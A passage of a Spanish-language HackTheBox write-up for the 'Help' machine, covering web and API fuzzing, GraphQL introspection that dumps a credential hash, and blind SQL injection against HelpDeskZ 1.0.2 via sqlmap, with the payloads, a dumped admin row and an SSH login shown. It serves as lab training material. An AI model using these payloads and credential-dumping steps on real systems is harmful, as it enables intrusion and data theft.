+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://help.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt -s 200,301 -b <span style="color:#e6db74">&#34;&#34;</span> -t <span style="color:#ae81ff">300</span> --ne
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.8.2
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:            http://help.htb/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:         GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:        <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes:   200,301
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:     gobuster/3.8.2
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:        10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 11321<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>javascript           <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 309<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://help.htb/javascript/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>support              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 306<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://help.htb/support/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.                    <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 11321<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">128370</span> / <span style="color:#ae81ff">128370</span> <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-s</em></td>
+					<td>Para aplicar un filtro que muestre solo los códigos de estado específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-b</em></td>
+					<td>Para que funcione el filtro anterior.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;ne</em></td>
+					<td>Para que no muestre errores.</td>
+			</tr>
+	</tbody>
+</table>
+<p>En ambos casos podemos ver 2 directorios, pero el que podremos ver será el de <strong>support</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-help/Captura4.png">
+</p>
+<p>Parece ser un servicio para crear tickets de soporte técnico y, para poder interactuar con esto, necesitamos credenciales válidas que de momento no tenemos.</p>
+<h4 id="fuzzPuerto3000">Aplicando Fuzzing a Página Web de Puerto 3000 - Buscando Endpoints de APIs</h4>
+<p>Algo importante cuando se aplica <strong>Fuzzing</strong> para encontrar <strong>APIs</strong> es que estas funcionan en su mayoría con peticiones <strong>POST</strong>.</p>
+<p>Primero probemos con <strong>ffuf</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt:FUZZ -X POST -u http://10.129.230.159:3000/FUZZ
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.1.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : POST
+</span></span><span style="display:flex;"><span> :: URL              : http://10.129.230.159:3000/FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>graphql                 <span style="color:#f92672">[</span>Status: 500, Size: 61, Words: 9, Lines: 1, Duration: 72ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>graphql                 <span style="color:#f92672">[</span>Status: 500, Size: 61, Words: 9, Lines: 1, Duration: 88ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>12334/12334<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">557</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:00:29<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-X</em></td>
+					<td>Para específicar un método HTTP a usar.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Ahora probemos con <strong>gobuster</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://10.129.230.159:3000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt -m POST --ne
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.8.2
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.129.230.159:3000/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  POST
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.8.2
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>graphql              <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 61<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>graphql              <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 61<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">12334</span> / <span style="color:#ae81ff">12334</span> <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-m</em></td>
+					<td>Para específicar un método HTTP a usar.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;ne</em></td>
+					<td>Para que no muestre errores.</td>
+			</tr>
+	</tbody>
+</table>
+<p>En ambos casos, encontramos un endpoint llamado <strong>graphql</strong>, lo que nos indica que se está utilizando <strong>GraphQL</strong> en esta página web.</p>
+<p>Y al visitarla, observa el mensaje que nos da:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-help/Captura5.png">
+</p>
+<p>Parece que tendremos que jugar con este endpoint para mandarle la data correcta y así obtener las credenciales que se mencionan en la página principal.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="Graphql">Aplicando Instrospección y Filtros para Obtener Credenciales en GraphQL</h3>
+<p>Al identificar que se utiliza <strong>GraphQL</strong>, una de las técnicas que podemos aplicar para enumerar la BD es la <strong>Introspección (Introspection)</strong>:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Introspection</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>La introspección en GraphQL es la capacidad que tiene la propia API de describirse a sí misma, permitiendo a un cliente consultar su estructura interna. Es un mecanismo que permite descubrir qué consultas (queries), modificaciones (mutations), tipos de datos y campos existen en una API GraphQL, sin necesidad de documentación externa.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Aquí te dejo un par de blogs que mencionan cómo aplicar la <strong>Introspección</strong>:</p>
+<ul>
+<li><a href="https://graphql.org/learn/introspection/" target="_blank">GraphQL: Introspection</a></li>
+<li><a href="https://portswigger.net/web-security/graphql#using-introspection" target="_blank">PortSwigger: GraphQL - Using Introspection</a></li>
+</ul>
+<p>Para poder aplicarla, vamos a capturar la petición que se hace hacia el endpoint <code>/graphql</code> con <strong>BurpSuite</strong> y la mandamos al <strong>Repeater</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-help/Captura6.png">
+</p>
+<p>Cambiaremos el método a <strong>POST</strong> y modificaremos la cabecera <code>Content-Type</code> con <code>application/json</code> para que acepte datos en <strong>JSON</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-help/Captura7.png">
+</p>
+<p>Ahora, puede ocupar la siguiente query de <strong>Introspección</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;query&#34;</span>: <span style="color:#e6db74">&#34;{ __schema { types { name } } }&#34;</span> <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>O dándole clic derecho en la petición, veremos que aparece hasta arriba la opción <strong>GraphQL</strong>, que nos da una lista de opciones, siendo una de estas la de <strong>Set introspection query</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-help/Captura8.png">
+</p>
+<p>En mi caso, ocuparé la primera opción, ya que te da solamente las variables y no información extra, aunque también te sugiero que pruebes la opción de <strong>BurpSuite</strong> para ver el resultado.</p>
+<p>Observa las variables que podemos encontrar:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-help/Captura9.png">
+</p>
+<p>Ahí podemos ver una variable llamada <strong>User</strong>.</p>
+<p>Vamos a consultarla con la siguiente query para poder ver cuáles son sus campos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;query&#34;</span>: <span style="color:#e6db74">&#34;{ __type(name:\&#34;User\&#34;) { name fields { name } } }&#34;</span> <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p align="center">
+<img src="/assets/images/htb-writeup-help/Captura10.png">
+</p>
+<p>Ahí vemos que ocupa los argumentos <strong>username</strong> y <strong>password</strong>, así que usaremos la siguiente query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;query&#34;</span>: <span style="color:#e6db74">&#34;{ user { username password } }&#34;</span> <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p align="center">
+<img src="/assets/images/htb-writeup-help/Captura11.png">
+</p>
+<p>Obtuvimos un usuario y contraseña, pero la contraseña parece ser un <strong>Hash MD5</strong>.</p>
+<p>Podemos utilizar la página <strong>Crackstation</strong> para poder crackear ese Hash:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-help/Captura12.png">
+</p>
+<p>Bien, ya tenemos la contraseña.</p>
+<p>Probando esas credenciales en <strong>HelpDeskZ</strong>, ganaremos acceso a la aplicación:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-help/Captura13.png">
+</p>
+<p>Busquemos una forma de explotar este servicio.</p>
+<h4 id="Exploits">Identificando Exploits para HelpDeskZ</h4>
+<p>Si buscamos un Exploit para <strong>HelpDeskZ</strong>, encontraremos los siguientes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit helpdeskZ
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                                                                              |  Path
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>HelpDeskZ 1.0.2 - Arbitrary File Upload                                                                                                                     | php/webapps/40300.py
+</span></span><span style="display:flex;"><span>HelpDeskZ &lt; 1.0.2 - <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span> SQL Injection / Unauthorized File Download                                                                              | php/webapps/41200.py
+</span></span><span style="display:flex;"><span>Helpdeskz v2.0.2 - Stored XSS                                                                                                                               | php/webapps/52068.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span></code></pre></div><p>Tenemos 3 Exploits que podríamos usar, pero podemos descartar algunos si encontramos la versión que se está usando de <strong>HelpDeskZ</strong>, siendo que podemos obtenerla al apuntar a la ruta <code>/readme.html</code>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-help/Captura14.png">
+</p>
+<p>Se está usando la versión <strong>1.0.2</strong>.</p>
+<p>Ahora podemos utilizar/analizar estos dos Exploits para aplicarlos.</p>
+<h3 id="HelpDeskZ2">Probando Exploit: HelpDeskZ &lt; 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download</h3>
+<p>Desarguemos ese Exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit -m php/webapps/41200.py
+</span></span><span style="display:flex;"><span>  Exploit: HelpDeskZ &lt; 1.0.2 - <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span> SQL Injection / Unauthorized File Download
+</span></span><span style="display:flex;"><span>      URL: https://www.exploit-db.com/exploits/41200
+</span></span><span style="display:flex;"><span>     Path: /usr/share/exploitdb/exploits/php/webapps/41200.py
+</span></span><span style="display:flex;"><span>    Codes: N/A
+</span></span><span style="display:flex;"><span> Verified: True
+</span></span><span style="display:flex;"><span>File Type: Python script, Unicode text, UTF-8 text executable, with very long lines <span style="color:#f92672">(</span>317<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>En el Exploit se nos deja un comentario de cómo funciona la <strong>Inyección SQL</strong> que resulta ser una <strong>ciega/blind</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>HelpDeskZ &lt;<span style="color:#f92672">=</span> v1.0.2 suffers from an sql injection vulnerability that allow to retrieve administrator access data, and download unauthorized attachments.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Software after ticket submit allow to download attachment by entering following link:
+</span></span><span style="display:flex;"><span>http://127.0.0.1/helpdeskz/?/?v<span style="color:#f92672">=</span>view_tickets&amp;action<span style="color:#f92672">=</span>ticket&amp;param<span style="color:#f92672">[]=</span>2<span style="color:#f92672">(</span>VALID_TICKET_ID_HERE<span style="color:#f92672">)</span>&amp;param<span style="color:#f92672">[]=</span>attachment&amp;param<span style="color:#f92672">[]=</span>1&amp;param<span style="color:#f92672">[]=</span>1<span style="color:#f92672">(</span>ATTACHMENT_ID_HERE<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Steps to reproduce:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>http://127.0.0.1/helpdeskz/?/?v<span style="color:#f92672">=</span>view_tickets&amp;action<span style="color:#f92672">=</span>ticket&amp;param<span style="color:#f92672">[]=</span>2<span style="color:#f92672">(</span>VALID_TICKET_ID_HERE<span style="color:#f92672">)</span>&amp;param<span style="color:#f92672">[]=</span>attachment&amp;param<span style="color:#f92672">[]=</span>1&amp;param<span style="color:#f92672">[]=</span><span style="color:#ae81ff">1</span> or id&gt;0 -- -
+</span></span></code></pre></div><p>En resumen, se nos dice que la vulnerabilidad se encuentra al momento de descargar un archivo, que es donde podemos aplicar la <strong>Inyección SQL Ciega</strong> y parece enfocarse en el parámetro <code>param[]</code>.</p>
+<p>Para reproducirla, necesitamos crear un ticket y debemos cargar un archivo que acepte la página, como uno de texto:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-help/Captura15.png">
+</p>
+<p>Revisando ese ticket y haciendo <strong>hoovering</strong>, encontraremos la ruta que es vulnerable:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-help/Captura16.png">
+</p>
+<p>Tan solo abre esa ruta en otra pestaña y aplica un <strong>SQLi</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-help/Captura17.png">
+</p>
+<p>Como ya sabemos que es una inyección ciega, tardaríamos bastante tiempo en tratar de dumpear la BD con estas inyecciones, así que para agilizarlo, usaremos la herramienta <strong>SQLMAP</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r requests.txt --level <span style="color:#ae81ff">5</span> --risk <span style="color:#ae81ff">3</span> -p param<span style="color:#f92672">[]</span> --batch
+</span></span><span style="display:flex;"><span>        ___
+</span></span><span style="display:flex;"><span>       __H__
+</span></span><span style="display:flex;"><span> ___ ___<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;]_____ ___ ___  {1.10#stable}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_ -| . [.]     | .&#39;| . |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|___|_  [(]_|_|_|__,|  _|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      |_|V...       |_|   https://sqlmap.org
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[19:33:00] [INFO] checking if the injection point on GET parameter &#39;param[]&#39; is a false positive
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">GET parameter &#39;param[]&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sqlmap identified the following injection point(s) with a total of 446 HTTP(s) requests:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Parameter: param[] (GET)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: boolean-based blind
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: AND boolean-based blind - WHERE or HAVING clause
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: v=view_tickets&amp;action=ticket&amp;param[]=4&amp;param[]=attachment&amp;param[]=1&amp;param[]=6 AND 6741=6741
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: time-based blind
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: v=view_tickets&amp;action=ticket&amp;param[]=4&amp;param[]=attachment&amp;param[]=1&amp;param[]=6 AND (SELECT 5698 FROM (SELECT(SLEEP(5)))lUvm)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[19:33:03] [INFO] the back-end DBMS is MySQL
+</span></span></span></code></pre></div><p>Excelente, ya pudimos identificar dónde aplicar la inyección.</p>
+<p>Ahora vamos a dumpear la BD:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r requests.txt --level <span style="color:#ae81ff">5</span> --risk <span style="color:#ae81ff">3</span> -p param<span style="color:#f92672">[]</span> --dump
+</span></span><span style="display:flex;"><span>        ___
+</span></span><span style="display:flex;"><span>       __H__
+</span></span><span style="display:flex;"><span> ___ ___<span style="color:#f92672">[)]</span>_____ ___ ___  <span style="color:#f92672">{</span>1.10#stable<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_ -| . <span style="color:#f92672">[</span>,<span style="color:#f92672">]</span>     | .<span style="color:#e6db74">&#39;| . |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|___|_  [&#34;]_|_|_|__,|  _|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      |_|V...       |_|   https://sqlmap.org
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[19:39:57] [INFO] cracked password &#39;</span>Welcome1<span style="color:#e6db74">&#39; for user &#39;</span>admin<span style="color:#960050;background-color:#1e0010">&#39;</span>                                                                                                                               
+</span></span><span style="display:flex;"><span>Database: support                                                                                                                                                                            
+</span></span><span style="display:flex;"><span>Table: staff
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> entry<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+----+--------------------+------------+--------+---------+----------+---------------+-----------------------------------------------------+----------+----------+--------------------------------+--------------------+------------+------------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| id | email              | login      | avatar | admin   | status   | fullname      | password                                            | timezone | username | signature                      | department         | last_login | newticket_notification |
+</span></span><span style="display:flex;"><span>+----+--------------------+------------+--------+---------+----------+---------------+-----------------------------------------------------+----------+----------+--------------------------------+--------------------+------------+------------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">1</span>  | support@mysite.com | <span style="color:#ae81ff">1547216217</span> | NULL   | <span style="color:#ae81ff">1</span>       | Enable   | Administrator | d318f44739dced66793b1a603028133a76ae680e <span style="color:#f92672">(</span>********<span style="color:#f92672">)</span> | &lt;blank&gt;  | admin    | Best regards,<span style="color:#ae81ff">\r\n</span>Administrator | a:1:<span style="color:#f92672">{</span>i:0;s:1:<span style="color:#e6db74">&#34;1&#34;</span>;<span style="color:#f92672">}</span> | <span style="color:#ae81ff">1543429746</span> | <span style="color:#ae81ff">0</span>                      |
+</span></span><span style="display:flex;"><span>+----+--------------------+------------+--------+---------+----------+---------------+-----------------------------------------------------+----------+----------+--------------------------------+--------------------+------------+------------------------+
+</span></span></code></pre></div><p>Obtuvimos un usuario y contraseña que podemos probar en el <strong>servicio SSH</strong>.</p>
+<p>Si bien el usuario no es correcto, solo toma un poco de tiempo adivinar cuál es el correcto:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh help@10.129.230.159
+</span></span><span style="display:flex;"><span>help@10.129.230.159<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 16.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-116-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Last login: Fri Jan <span style="color:#ae81ff">11</span> 06:18:50 <span style="color:#ae81ff">2019</span>
+</span></span><span style="display:flex;"><span>help@help:~$ whoami
+</span></span><span style="display:flex;"><span>help
+</span></span></code></pre></div><p>Estamos dentro.</p>
+<p>Busquemos la flag del usuario:</p>
